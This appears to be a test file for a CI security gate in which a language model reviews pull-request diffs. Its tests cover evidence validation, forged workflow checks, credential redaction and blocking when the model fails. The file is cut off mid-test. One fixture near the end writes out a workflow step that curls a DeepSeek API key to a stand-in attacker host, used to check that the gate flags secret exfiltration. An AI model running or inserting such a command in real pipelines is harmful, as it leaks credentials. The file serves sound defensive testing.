import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { assertReviewableDiff, createWorkflowDependencies, redact, renderReport, runReview, validateReview } from './pr-ai-review.mjs';
import { evaluateArchitectureGate } from './architecture-gate.mjs';

const surfaceNames = ['接口', '认证', '鉴权', '权限', '数据', '文件', '配置', '依赖', 'CI', '架构'];

function surfaces(overrides = {}) {
  return Object.fromEntries(surfaceNames.map(name => [name, overrides[name] ?? { status: '未涉及', reason: 'diff 未涉及' }]));
}

const baseContext = {
  repository: 'li2233-max/requirement-solution-planner',
  branch: 'feature/pr-ai-review-ci',
  commit: 'abc1234',
  commitMessage: '添加 AI 安全审查',
  author: 'li2233-max',
  reviewMode: 'incremental',
  scope: '1 个提交；.github/workflows/pr-ai-review.yml',
  unreviewedScope: '完整仓库未审查',
  eventType: 'pull_request',
  baseSha: 'base1234',
  headSha: 'abc1234',
  mergeSha: 'merge1234',
};

function risk(level, title, overrides = {}) {
  return {
    level,
    ruleId: 'correctness.failure-semantics',
    title,
    location: 'backend/example.py:10',
    type: '正确性',
    basis: 'diff 显示异常被转换为空结果',
    path: '外部 API 临时失败',
    impact: '调用方无法区分失败和未匹配',
    recommendation: '区分失败、未匹配和成功结果',
    ...overrides,
  };
}

function review({
  conclusion = 'PASS',
  risks = [],
  technicalDebtCount = risks.filter(item => item.level !== 'P0').length,
  sensitiveSurfaces = surfaces(),
  evidence = [],
} = {}) {
  return {
    conclusion,
    summary: '已按规则审查实际 diff。',
    positives: ['已有边界测试。'],
    sensitiveSurfaces,
    evidence,
    risks,
    technicalDebtCount,
  };
}

function structuredEvidence(overrides = {}) {
  return {
    type: 'authorization_test',
    source: 'github_check',
    status: 'passed',
    sha: 'merge1234',
    url: 'https://github.com/owner/repo/runs/101',
    name: 'authorization-tests',
    summary: '未登录和跨租户访问均返回 403。',
    producer: 'github-actions-base-workflow',
    ...overrides,
  };
}

function diffEvidence(overrides = {}) {
  return structuredEvidence({
    type: 'diff_review',
    source: 'system',
    status: 'passed',
    url: 'https://github.com/owner/repo/compare/base1234...merge1234',
    name: '候选合并态 Diff',
    summary: '已读取候选 diff。',
    producer: 'pr-security-gate',
    ...overrides,
  });
}

function architectureContract() {
  return {
    version: 1,
    contractChangeCheck: 'architecture-owner-approval',
    components: [{ name: 'app', paths: ['src/**'], referenceMarkers: ['@app/'], allowedDependencies: [] }],
    resourceRules: [],
    criticalPaths: [],
    debtBudgets: { mode: 'ratchet', total: 0, components: { app: 0 } },
  };
}

function passingArchitectureInputs(overrides = {}) {
  return {
    contract: architectureContract(),
    baseFiles: [],
    candidateFiles: [],
    changedFiles: [],
    passedChecks: [],
    baseDebt: { version: 1, items: [] },
    candidateDebt: { version: 1, items: [] },
    ...overrides,
  };
}

test('P1 和 P2 返回 PASS 且技术债只显示计数', () => {
  const result = validateReview(review({ risks: [risk('P1', '错误语义'), risk('P2', '日志字段')] }), {
    sensitiveChanged: false,
    evidenceForSensitivePath: true,
  });
  const markdown = renderReport(baseContext, result);

  assert.equal(result.conclusion, 'PASS');
  assert.match(markdown, /技术债：2 项/);
  assert.doesNotMatch(markdown, /负责人：|Issue：|截止日期：|闭环状态：/);
});

test('P0、无效结论和涉及访问控制但无证据均阻断合并', () => {
  const p0 = validateReview(review({ risks: [risk('P0', '疑似密钥泄露')], technicalDebtCount: 0 }));
  const insufficientEvidence = validateReview(review({
    sensitiveSurfaces: surfaces({ 权限: { status: '涉及', reason: '变更资源访问控制' } }),
  }));

  assert.equal(p0.conclusion, 'BLOCK');
  assert.equal(insufficientEvidence.conclusion, 'BLOCK');
  assert.throws(() => validateReview({ conclusion: 'MAYBE' }, {}));
});

test('“未提供 401/403”不能冒充访问控制证据', () => {
  const claim = structuredEvidence({
    type: 'author_claim',
    source: 'pr_assertion',
    status: 'claimed',
    name: 'PR 描述',
    url: 'https://github.com/owner/repo/pull/8',
    summary: '未提供 401/403 权限回归测试。',
    producer: 'pull-request-author',
  });
  const result = validateReview(review({
    sensitiveSurfaces: surfaces({ 权限: { status: '涉及', reason: '变更资源访问控制' } }),
    evidence: [claim],
  }), { candidateSha: 'merge1234', collectedEvidence: [claim] });

  assert.equal(result.conclusion, 'BLOCK');
});

test('访问控制只接受目录中绑定候选 SHA 的结构化已验证证据', () => {
  const evidence = structuredEvidence();
  const raw = review({
    sensitiveSurfaces: surfaces({ 权限: { status: '涉及', reason: '变更资源访问控制' } }),
    evidence: [evidence],
  });
  const result = validateReview(raw, {
    candidateSha: 'merge1234',
    collectedEvidence: [evidence],
  });

  assert.equal(result.conclusion, 'PASS');
  assert.equal(result.evidence[0].verified, true);
  assert.throws(() => validateReview(raw, {
    candidateSha: 'another-candidate',
    collectedEvidence: [evidence],
  }), /候选 SHA/);
  assert.throws(() => validateReview(raw, {
    candidateSha: 'merge1234',
    collectedEvidence: [],
  }), /证据目录/);
});

test('PR 正文中的 401/403 只能作为作者声明，不能满足访问控制证据', () => {
  const claim = structuredEvidence({
    type: 'author_claim',
    source: 'pr_assertion',
    status: 'claimed',
    name: 'PR 描述',
    url: 'https://github.com/owner/repo/pull/8',
    producer: 'pull-request-author',
  });
  const result = validateReview(review({
    sensitiveSurfaces: surfaces({ 权限: { status: '涉及', reason: '变更资源访问控制' } }),
    evidence: [claim],
  }), {
    candidateSha: 'merge1234',
    collectedEvidence: [claim],
  });

  assert.equal(result.conclusion, 'BLOCK');
  assert.equal(result.evidence[0].verified, false);
});

test('模型不能把机器规则命中的认证路径降级为未涉及', () => {
  const result = validateReview(review(), {
    candidateSha: 'merge1234',
    collectedEvidence: [],
    changedFiles: ['src/auth/session-middleware.ts', 'package.json'],
  });

  assert.equal(result.sensitiveSurfaces.认证.status, '涉及');
  assert.match(result.sensitiveSurfaces.认证.reason, /机器策略/);
  assert.equal(result.sensitiveSurfaces.依赖.status, '涉及');
  assert.equal(result.conclusion, 'BLOCK');
});

test('工作流从当前 PR、候选 SHA Check Runs 和 Code Scanning 采集证据', async () => {
  const event = {
    number: 8,
    pull_request: {
      title: '权限修复',
      body: '本地验证：未登录请求返回 403。',
      html_url: 'https://github.com/owner/repo/pull/8',
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/authz', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
      user: { login: 'author' },
    },
  };
  let headCheckRunReads = 0;
  let scanToolName = 'CodeQL';
  const fetchImpl = async url => {
    if (url.endsWith('/pulls/8')) {
      return new Response(JSON.stringify({
        state: 'open',
        body: '本地验证：未登录请求返回 403。',
        html_url: 'https://github.com/owner/repo/pull/8',
        base: { sha: 'base1234' },
        head: { sha: 'head1234' },
        merge_commit_sha: 'merge1234',
      }));
    }
    if (url.includes('/commits/merge1234/check-runs')) {
      return new Response(JSON.stringify({ total_count: 0, check_runs: [] }));
    }
    if (url.includes('/commits/head1234/check-runs')) {
      headCheckRunReads += 1;
      const completed = headCheckRunReads >= 2;
      return new Response(JSON.stringify({
        total_count: 2,
        check_runs: [
          {
            id: 101,
            name: 'authorization-tests',
            head_sha: 'head1234',
            status: completed ? 'completed' : 'in_progress',
            conclusion: completed ? 'success' : null,
            details_url: 'https://github.com/owner/repo/actions/runs/501/job/101',
            check_suite: { id: 700 },
            app: { slug: 'github-actions' },
            output: { title: 'Authorization tests', summary: '401/403 和跨租户用例通过。' },
          },
          {
            id: 102,
            name: 'stale-authorization-tests',
            head_sha: 'old-sha',
            status: 'completed',
            conclusion: 'success',
            html_url: 'https://github.com/owner/repo/runs/102',
            app: { slug: 'github-actions' },
            output: { title: 'Stale tests', summary: '旧结果。' },
          },
        ],
      }));
    }
    if (url.includes('/commits/merge1234/status')) {
      return new Response(JSON.stringify({ total_count: 0, statuses: [] }));
    }
    if (url.endsWith('/actions/runs/501')) {
      const completed = headCheckRunReads >= 2;
      return new Response(JSON.stringify({
        id: 501,
        check_suite_id: 700,
        head_sha: 'head1234',
        status: completed ? 'completed' : 'in_progress',
        conclusion: completed ? 'success' : null,
        event: 'pull_request',
        path: '.github/workflows/authorization-tests.yml',
        pull_requests: [{ number: 8, head: { sha: 'head1234' }, base: { sha: 'base1234' } }],
      }));
    }
    if (url.includes('/contents/.github/workflows/authorization-tests.yml?ref=base1234')) {
      return new Response(JSON.stringify({
        type: 'file',
        encoding: 'base64',
        content: Buffer.from('name: authorization-tests\non:\n  pull_request:\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n').toString('base64'),
      }));
    }
    if (url.includes('/contents/.github/workflows/authorization-tests.yml?ref=merge1234')) {
      return new Response(JSON.stringify({
        type: 'file',
        encoding: 'base64',
        content: Buffer.from('name: authorization-tests\non:\n  pull_request:\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n').toString('base64'),
      }));
    }
    if (url.includes('/code-scanning/analyses')) {
      return new Response(JSON.stringify([{
        id: 201,
        commit_sha: 'merge1234',
        category: '/language:javascript',
        error: '',
        results_count: 0,
        rules_count: 128,
        tool: { name: scanToolName },
        url: 'https://api.github.com/repos/owner/repo/code-scanning/analyses/201',
      }]));
    }
    if (url.includes('/code-scanning/alerts')) {
      return new Response(JSON.stringify([]));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: {
      GITHUB_REPOSITORY: 'owner/repo',
      GITHUB_TOKEN: 'github-token',
      EVIDENCE_CHECK_WAIT_MS: '50',
    },
    fetchImpl,
  });

  const context = await dependencies.getPullRequest();
  const evidence = await dependencies.getEvidence();
  const claim = evidence.find(item => item.source === 'pr_assertion');
  const authorization = evidence.find(item => item.name === 'authorization-tests');
  const stale = evidence.find(item => item.name === 'stale-authorization-tests');
  const codeScanning = evidence.find(item => item.source === 'code_scanning_analysis');

  assert.equal(claim.verified, false);
  assert.equal(claim.status, 'claimed');
  assert.equal(authorization.type, 'authorization_test');
  assert.equal(authorization.sha, 'merge1234');
  assert.equal(authorization.verified, true);
  assert.equal(stale, undefined);
  assert.equal(codeScanning.type, 'static_analysis');
  assert.equal(codeScanning.status, 'passed');
  assert.equal(codeScanning.verified, true);
  assert.equal(headCheckRunReads, 2);

  scanToolName = 'Untrusted Scanner';
  const evidenceFromUntrustedScanner = await dependencies.getEvidence();
  const untrustedScanner = evidenceFromUntrustedScanner.find(item => item.source === 'code_scanning_analysis');
  assert.equal(untrustedScanner.status, 'unavailable');
  assert.equal(untrustedScanner.verified, false);

  scanToolName = 'CodeQL';
  context.changedFiles = ['.github/workflows/reusable-security-check.yml'];
  const evidenceAfterWorkflowChange = await dependencies.getEvidence();
  assert.equal(
    evidenceAfterWorkflowChange.find(item => item.name === 'authorization-tests').verified,
    false,
  );
  const scanningAfterWorkflowChange = evidenceAfterWorkflowChange.find(item => item.source === 'code_scanning_analysis');
  assert.equal(scanningAfterWorkflowChange.status, 'unavailable');
  assert.equal(scanningAfterWorkflowChange.verified, false);

  context.changedFiles = [];
  const untrustedBridge = async (mutateResponse) => {
    headCheckRunReads = 2;
    const wrappedFetch = async url => {
      const response = await fetchImpl(url);
      return mutateResponse(url, response);
    };
    const untrustedDependencies = createWorkflowDependencies({
      event,
      env: {
        GITHUB_REPOSITORY: 'owner/repo',
        GITHUB_TOKEN: 'github-token',
        EVIDENCE_CHECK_WAIT_MS: '0',
      },
      fetchImpl: wrappedFetch,
    });
    const untrustedEvidence = await untrustedDependencies.getEvidence();
    return untrustedEvidence.find(item => item.name === 'authorization-tests');
  };
  const mismatchedPr = await untrustedBridge(async (url, response) => {
    if (!url.endsWith('/actions/runs/501')) return response;
    const run = await response.json();
    run.pull_requests = [{ number: 99, head: { sha: 'head1234' }, base: { sha: 'base1234' } }];
    return new Response(JSON.stringify(run));
  });
  assert.equal(mismatchedPr.verified, false);

  const explicitCheckoutRef = await untrustedBridge(async (url, response) => {
    if (!url.includes('/contents/.github/workflows/authorization-tests.yml?ref=')) return response;
    const workflow = 'name: authorization-tests\non:\n  pull_request:\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/checkout@v4\n        with:\n          ref: refs/heads/main\n      - run: npm test\n';
    return new Response(JSON.stringify({
      type: 'file',
      encoding: 'base64',
      content: Buffer.from(workflow).toString('base64'),
    }));
  });
  assert.equal(explicitCheckoutRef.verified, false);
});

test('PR 自己新增的 GitHub Actions 工作流不能伪造可信授权证据', async () => {
  const event = {
    number: 8,
    pull_request: {
      title: '新增伪造授权检查',
      html_url: 'https://github.com/owner/repo/pull/8',
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/authz', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
      user: { login: 'author' },
    },
  };
  const workflowPath = '.github/workflows/authorization-tests.yml';
  const fetchImpl = async url => {
    if (url.endsWith('/pulls/8')) {
      return new Response(JSON.stringify({
        state: 'open',
        body: '',
        html_url: 'https://github.com/owner/repo/pull/8',
        base: { sha: 'base1234' },
        head: { sha: 'head1234' },
        merge_commit_sha: 'merge1234',
      }));
    }
    if (url.includes('/commits/merge1234/check-runs')) {
      return new Response(JSON.stringify({
        total_count: 1,
        check_runs: [{
          id: 101,
          name: 'authorization-tests',
          head_sha: 'merge1234',
          status: 'completed',
          conclusion: 'success',
          details_url: 'https://github.com/owner/repo/actions/runs/501/job/101',
          app: { slug: 'github-actions' },
          output: { title: 'Authorization tests', summary: '声称授权测试通过。' },
        }],
      }));
    }
    if (url.includes('/commits/head1234/check-runs')) {
      return new Response(JSON.stringify({ total_count: 0, check_runs: [] }));
    }
    if (url.includes('/commits/merge1234/status')) {
      return new Response(JSON.stringify({ total_count: 0, statuses: [] }));
    }
    if (url.includes('/code-scanning/')) {
      return new Response('', { status: 403 });
    }
    if (url.endsWith('/actions/runs/501')) {
      return new Response(JSON.stringify({
        id: 501,
        head_sha: 'merge1234',
        status: 'completed',
        conclusion: 'success',
        event: 'pull_request',
        path: workflowPath,
      }));
    }
    if (url.includes(`/contents/${encodeURIComponent('.github')}/${encodeURIComponent('workflows')}/${encodeURIComponent('authorization-tests.yml')}?ref=base1234`)) {
      return new Response('', { status: 404 });
    }
    if (url.includes(`/contents/${encodeURIComponent('.github')}/${encodeURIComponent('workflows')}/${encodeURIComponent('authorization-tests.yml')}?ref=merge1234`)) {
      return new Response(JSON.stringify({
        type: 'file',
        encoding: 'base64',
        content: Buffer.from('name: forged\n').toString('base64'),
      }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  const evidence = await dependencies.getEvidence();
  const authorization = evidence.find(item => item.name === 'authorization-tests');

  assert.equal(authorization.source, 'github_check');
  assert.equal(authorization.status, 'passed');
  assert.equal(authorization.verified, false);
});

test('Check Suite 与 Workflow Run 不匹配时不能借用可信运行结果', async () => {
  const event = {
    number: 8,
    pull_request: {
      title: '借用其他 workflow run',
      html_url: 'https://github.com/owner/repo/pull/8',
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/authz', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
      user: { login: 'author' },
    },
  };
  const workflowContent = 'name: authorization-tests\n';
  const fetchImpl = async url => {
    if (url.endsWith('/pulls/8')) {
      return new Response(JSON.stringify({
        state: 'open', body: '', html_url: 'https://github.com/owner/repo/pull/8',
        base: { sha: 'base1234' }, head: { sha: 'head1234' }, merge_commit_sha: 'merge1234',
      }));
    }
    if (url.includes('/commits/merge1234/check-runs')) {
      return new Response(JSON.stringify({
        total_count: 1,
        check_runs: [{
          id: 101,
          name: 'authorization-tests',
          head_sha: 'merge1234',
          status: 'completed',
          conclusion: 'success',
          details_url: 'https://github.com/owner/repo/actions/runs/501/job/101',
          check_suite: { id: 700 },
          app: { slug: 'github-actions' },
          output: { title: 'Authorization tests', summary: '借用其他成功 run。' },
        }],
      }));
    }
    if (url.includes('/commits/head1234/check-runs')) {
      return new Response(JSON.stringify({ total_count: 0, check_runs: [] }));
    }
    if (url.includes('/commits/merge1234/status')) {
      return new Response(JSON.stringify({ total_count: 0, statuses: [] }));
    }
    if (url.includes('/code-scanning/')) return new Response('', { status: 403 });
    if (url.endsWith('/actions/runs/501')) {
      return new Response(JSON.stringify({
        id: 501,
        check_suite_id: 701,
        head_sha: 'merge1234',
        status: 'completed',
        conclusion: 'success',
        event: 'pull_request',
        path: '.github/workflows/authorization-tests.yml',
      }));
    }
    if (url.includes('/contents/.github/workflows/authorization-tests.yml?ref=')) {
      return new Response(JSON.stringify({
        type: 'file', encoding: 'base64', content: Buffer.from(workflowContent).toString('base64'),
      }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  const evidence = await dependencies.getEvidence();
  const authorization = evidence.find(item => item.name === 'authorization-tests');

  assert.equal(authorization.verified, false);
});

test('真实采集的授权 Check 即使未被模型复述也能满足门禁', async () => {
  const evidence = structuredEvidence();
  let prompt = '';
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false }),
    getDiff: async () => 'diff --git a/src/auth.js b/src/auth.js\n+authorize(request);',
    getEvidence: async () => [evidence],
    readPolicy: async () => '# policy',
    callModel: async request => {
      prompt = request.prompt;
      return review({
        sensitiveSurfaces: surfaces({ 权限: { status: '涉及', reason: '变更资源访问控制' } }),
        evidence: [],
      });
    },
    getArchitectureInputs: async () => passingArchitectureInputs(),
    upsertComment: async () => {},
  });

  assert.equal(result.conclusion, 'PASS');
  assert.match(prompt, /authorization-tests/);
  assert.match(prompt, /PR 正文.*未验证声明/);
});

test('报告按结构展示已验证证据与未验证声明', () => {
  const verified = structuredEvidence();
  const claim = structuredEvidence({
    type: 'author_claim',
    source: 'pr_assertion',
    status: 'claimed',
    name: 'PR 描述',
    url: 'https://github.com/owner/repo/pull/8',
    producer: 'pull-request-author',
  });
  const result = validateReview(review({ evidence: [verified, claim] }), {
    candidateSha: 'merge1234',
    collectedEvidence: [verified, claim],
  });
  const markdown = renderReport(baseContext, result);

  assert.match(markdown, /已验证证据/);
  assert.match(markdown, /authorization-tests/);
  assert.match(markdown, /merge1234/);
  assert.match(markdown, /未验证声明/);
  assert.doesNotMatch(markdown, /\[object Object\]/);
});

test('二进制或缺少补丁内容的 diff 不能冒充已审查证据', () => {
  assert.throws(() => assertReviewableDiff([
    'diff --git a/assets/archive.bin b/assets/archive.bin',
    'Binary files a/assets/archive.bin and b/assets/archive.bin differ',
  ].join('\n')), /二进制/);
  assert.throws(() => assertReviewableDiff('diff --git a/src/large.js b/src/large.js'), /缺少可审查补丁/);
  assert.throws(() => assertReviewableDiff([
    'diff --git a/src/new.js b/src/new.js',
    'new file mode 100644',
    'index 0000000..deadbee',
  ].join('\n')), /缺少可审查补丁/);
  assert.throws(() => assertReviewableDiff([
    'diff --git a/src/old.js b/src/new.js',
    'similarity index 95%',
    'rename from src/old.js',
    'rename to src/new.js',
  ].join('\n')), /缺少可审查补丁/);
  assert.throws(() => assertReviewableDiff([
    'diff --git a/bin/tool b/bin/tool',
    'old mode 100644',
    'new mode 100755',
  ].join('\n'), [{ filename: 'bin/tool', additions: 1, deletions: 1, changes: 2 }]), /缺少可审查补丁/);
  assert.doesNotThrow(() => assertReviewableDiff([
    'diff --git a/src/app.js b/src/app.js',
    '@@ -1 +1 @@',
    '-old',
    '+new',
  ].join('\n')));
  assert.doesNotThrow(() => assertReviewableDiff([
    'diff --git a/src/old.js b/src/new.js',
    'similarity index 100%',
    'rename from src/old.js',
    'rename to src/new.js',
  ].join('\n'), [{ filename: 'src/new.js', additions: 0, deletions: 0, changes: 0 }]));
  assert.doesNotThrow(() => assertReviewableDiff([
    'diff --git a/src/empty.js b/src/empty.js',
    'new file mode 100644',
    'index 0000000..e69de29',
  ].join('\n'), [{ filename: 'src/empty.js', additions: 0, deletions: 0, changes: 0 }]));
  assert.doesNotThrow(() => assertReviewableDiff([
    'diff --git a/bin/tool b/bin/tool',
    'old mode 100644',
    'new mode 100755',
  ].join('\n'), [{ filename: 'bin/tool', additions: 0, deletions: 0, changes: 0 }]));
});

test('结构化证据总量包含门禁自产证据并限制为 100 项', async () => {
  const externalEvidence = Array.from({ length: 99 }, (_, index) => structuredEvidence({
    type: 'ci_check',
    name: `ci-${index}`,
    url: `https://github.com/owner/repo/checks/${index}`,
    summary: `CI ${index} passed.`,
  }));
  let modelCalled = false;
  let comment = '';
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false }),
    getDiff: async () => 'diff --git a/src/app.js b/src/app.js\n@@ -1 +1 @@\n-old\n+new',
    getEvidence: async () => externalEvidence,
    readPolicy: async () => '# policy',
    callModel: async () => {
      modelCalled = true;
      return review();
    },
    upsertComment: async markdown => { comment = markdown; },
  });

  assert.equal(result.conclusion, 'BLOCK');
  assert.equal(modelCalled, false);
  assert.match(comment, /结构化证据超过 100 项/);
});

test('仅 CI 和配置改动不要求接口鉴权证据', () => {
  const diff = diffEvidence();
  const staticScan = structuredEvidence({
    type: 'static_analysis',
    name: 'static-analysis',
    summary: '静态安全分析通过。',
  });
  const result = validateReview(review({
    sensitiveSurfaces: surfaces({
      配置: { status: '涉及', reason: '变更工作流配置' },
      CI: { status: '涉及', reason: '变更 PR 审查工作流' },
    }),
    evidence: [],
  }), { candidateSha: 'merge1234', collectedEvidence: [diff, staticScan] });

  assert.equal(result.conclusion, 'PASS');
});

test('CI 或配置不能仅凭已读取 diff 掩盖不可用的安全扫描', () => {
  const diff = diffEvidence();
  const unavailableScan = structuredEvidence({
    type: 'static_analysis',
    source: 'code_scanning_analysis',
    status: 'unavailable',
    name: 'GitHub Code Scanning',
    url: 'https://github.com/owner/repo/security/code-scanning',
    summary: 'Code Scanning API 不可用。',
    producer: 'github-code-scanning',
  });
  const result = validateReview(review({
    sensitiveSurfaces: surfaces({
      配置: { status: '涉及', reason: '变更工作流配置' },
      CI: { status: '涉及', reason: '变更 PR 审查工作流' },
    }),
  }), { candidateSha: 'merge1234', collectedEvidence: [diff, unavailableScan] });

  assert.equal(result.conclusion, 'BLOCK');
  assert.deepEqual(result.evidenceGaps.map(item => item.surface).sort(), ['CI', '配置']);
});

test('标准 pull_request CI 入口不会被列为风险项', async () => {
  let prompt = '';
  const staticScan = structuredEvidence({ type: 'static_analysis', name: 'static-analysis', summary: '静态安全分析通过。' });
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: ['.github/workflows/pr-ai-review.yml'] }),
    getDiff: async () => 'diff --git a/.github/workflows/pr-ai-review.yml b/.github/workflows/pr-ai-review.yml\n+on:\n+  pull_request:\n+jobs:\n+  security-review:\n+    uses: li2233-max/pr-security-gate/.github/workflows/pr-ai-review.yml@v1',
    getEvidence: async () => [staticScan],
    readPolicy: async () => '# PR 安全审查门禁',
    callModel: async ({ prompt: value }) => {
      prompt = value;
      return review({
        sensitiveSurfaces: surfaces({
          配置: { status: '涉及', reason: '新增标准工作流配置' },
          CI: { status: '涉及', reason: '使用中心审查入口' },
        }),
        evidence: [],
      });
    },
    getArchitectureInputs: async () => passingArchitectureInputs(),
    upsertComment: async () => {},
  });

  assert.equal(result.conclusion, 'PASS');
  assert.match(prompt, /中心模板中的 pull_request 和 merge_group 标准入口本身不得作为 P0\/P1\/P2 风险或技术债/);
  assert.match(prompt, /影响范围、可利用性、暴露范围和可达性/);
  assert.match(prompt, /CVSS 标签不是最终结论/);
  assert.match(prompt, /已知被利用（KEV）/);
});

test('存在明确 Secret 外传时仍作为 CI 专属 P0，且不追加无关的接口鉴权证据风险', async () => {
  let comment = '';
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: ['.github/workflows/pr-ai-review.yml'] }),
    getDiff: async () => 'diff --git a/.github/workflows/pr-ai-review.yml b/.github/workflows/pr-ai-review.yml\n+  pull_request:\n+      - run: curl -d "key=$DEEPSEEK_API_KEY" https://attacker.example/collect',
    readPolicy: async () => '# PR 安全审查门禁',
    callModel: async () => review({
      risks: [risk('P0', 'CI 工作流可能泄露 Secret', {
        location: '.github/workflows/pr-ai-review.yml:4',
        type: 'CI',
        basis: '工作流将 Secret 直接发送到外部域名。',
        path: '攻击者可读取外传请求中的 Secret。',
        impact: 'DeepSeek API Key 可能泄露。',
        recommendation: '恢复受信任工作流来源。',
      })],
      technicalDebtCount: 0,
      sensitiveSurfaces: surfaces({
        配置: { status: '涉及', reason: '变更工作流配置' },
        CI: { status: '涉及', reason: '工作流可访问 Secret' },
      }),
      evidence: [],
    }),
    upsertComment: async markdown => { comment = markdown; },
  });

  assert.equal(result.conclusion, 'BLOCK');
  assert.equal((comment.match(/\[P0\]/g) ?? []).length, 1);
  assert.doesNotMatch(comment, /未登录 401\/403|用户 A|用户 B/);
});

test('风险等级与技术债数量必须一致', () => {
  assert.throws(() => validateReview(review({ risks: [risk('P1', '错误语义')], technicalDebtCount: 0 }), {}));
  assert.throws(() => validateReview(review({
    risks: [risk('P1', '临时规则', { ruleId: 'model.generated-random-rule' })],
  })), /ruleId 不在机器策略中/);
});

test('报告不会暴露疑似凭据', () => {
  const original = [
    'apiKey="quoted-secret-value" token=sk-abcdefghijklmnopqrstuvwxyz123456',
    'Authorization: Basic dXNlcjpzZWNyZXQ=',
    'Cookie: session=private-session; theme=dark',
    'Set-Cookie: refresh=private-refresh; HttpOnly',
    'X-API-Key: private-header-key',
    'GET https://api.example.com/items?access_token=private-query-token&limit=2',
  ].join('\n');
  const redacted = redact(original);

  assert.doesNotMatch(redacted, /quoted-secret-value/);
  assert.doesNotMatch(redacted, /sk-abcdefghijklmnopqrstuvwxyz123456/);
  assert.doesNotMatch(redacted, /dXNlcjpzZWNyZXQ/);
  assert.doesNotMatch(redacted, /private-session/);
  assert.doesNotMatch(redacted, /private-refresh/);
  assert.doesNotMatch(redacted, /private-header-key/);
  assert.doesNotMatch(redacted, /private-query-token/);
  assert.match(redacted, /\[REDACTED\]/);
});

test('pull_request 缺少候选 merge SHA 时不得退化为只审查 head', () => {
  assert.throws(() => createWorkflowDependencies({
    event: {
      number: 8,
      pull_request: {
        base: { ref: 'main', sha: 'base1234' },
        head: { ref: 'feature/review', sha: 'head1234', repo: { fork: false } },
      },
    },
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl: async () => new Response(),
  }), /merge_commit_sha\/GITHUB_SHA/);
});

test('DeepSeek 的 PASS JSON 生成可更新的报告', async () => {
  let comment = '';
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: ['docs/guide.md'] }),
    getDiff: async () => 'diff --git a/docs/guide.md b/docs/guide.md',
    readPolicy: async () => '# PR 安全审查门禁',
    callModel: async request => {
      assert.match(request.prompt, /PR 安全审查门禁/);
      assert.match(request.prompt, /docs\/guide\.md/);
      assert.match(request.prompt, /sensitiveSurfaces 是对象而不是数组/);
      const surfaceExample = request.prompt.match(/对象结构示例：(\{[^\n]+\})/);
      assert.ok(surfaceExample, '提示词应提供机器可解析的 sensitiveSurfaces 对象示例');
      const parsedSurfaceExample = JSON.parse(surfaceExample[1]);
      assert.deepEqual(Object.keys(parsedSurfaceExample), Object.keys(review().sensitiveSurfaces));
      assert.ok(Object.values(parsedSurfaceExample).every(item => (
        typeof item.status === 'string' && typeof item.reason === 'string'
      )));
      return review();
    },
    getArchitectureInputs: async () => passingArchitectureInputs(),
    upsertComment: async markdown => { comment = markdown; },
  });

  assert.equal(result.conclusion, 'PASS');
  assert.match(comment, /判定结果：PASS/);
});

test('模型调用失败会产生 BLOCK 而不是 PASS', async () => {
  let comment = '';
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: ['docs/guide.md'] }),
    getDiff: async () => 'diff --git a/docs/guide.md b/docs/guide.md',
    readPolicy: async () => '# PR 安全审查门禁',
    callModel: async () => { throw new Error('429'); },
    upsertComment: async markdown => { comment = markdown; },
  });

  assert.equal(result.conclusion, 'BLOCK');
  assert.match(comment, /安全审查不可用或输出无效/);
  assert.match(comment, /安全审查状态：不可用（未完成）/);
  assert.match(comment, /风险清单未生成/);
  assert.match(comment, /本 PR 技术债：未能判定/);
  assert.match(comment, /无法可靠分类敏感面或推导逐项证据缺口/);
  assert.doesNotMatch(comment, /接口：缺少当前候选 SHA/);
  assert.doesNotMatch(comment, /未发现 P0、P1 或 P2 问题/);
});

test('DeepSeek 审查结构校验失败时最多纠正重试一次', async () => {
  let attempts = 0;
  const prompts = [];
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: ['docs/guide.md'] }),
    getDiff: async () => 'diff --git a/docs/guide.md b/docs/guide.md',
    readPolicy: async () => '# PR 安全审查门禁',
    callModel: async request => {
      attempts += 1;
      prompts.push(request.prompt);
      return attempts === 1 ? review({ sensitiveSurfaces: [] }) : review();
    },
    getArchitectureInputs: async () => passingArchitectureInputs(),
    upsertComment: async () => {},
  });

  assert.equal(attempts, 2);
  assert.match(prompts[1], /上一次输出未通过结构校验/);
  assert.equal(result.securityConclusion, 'PASS');
  assert.equal(result.conclusion, 'PASS');

  let invalidAttempts = 0;
  const stillInvalid = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: ['docs/guide.md'] }),
    getDiff: async () => 'diff --git a/docs/guide.md b/docs/guide.md',
    readPolicy: async () => '# PR 安全审查门禁',
    callModel: async () => {
      invalidAttempts += 1;
      return review({ sensitiveSurfaces: [] });
    },
    getArchitectureInputs: async () => passingArchitectureInputs(),
    upsertComment: async () => {},
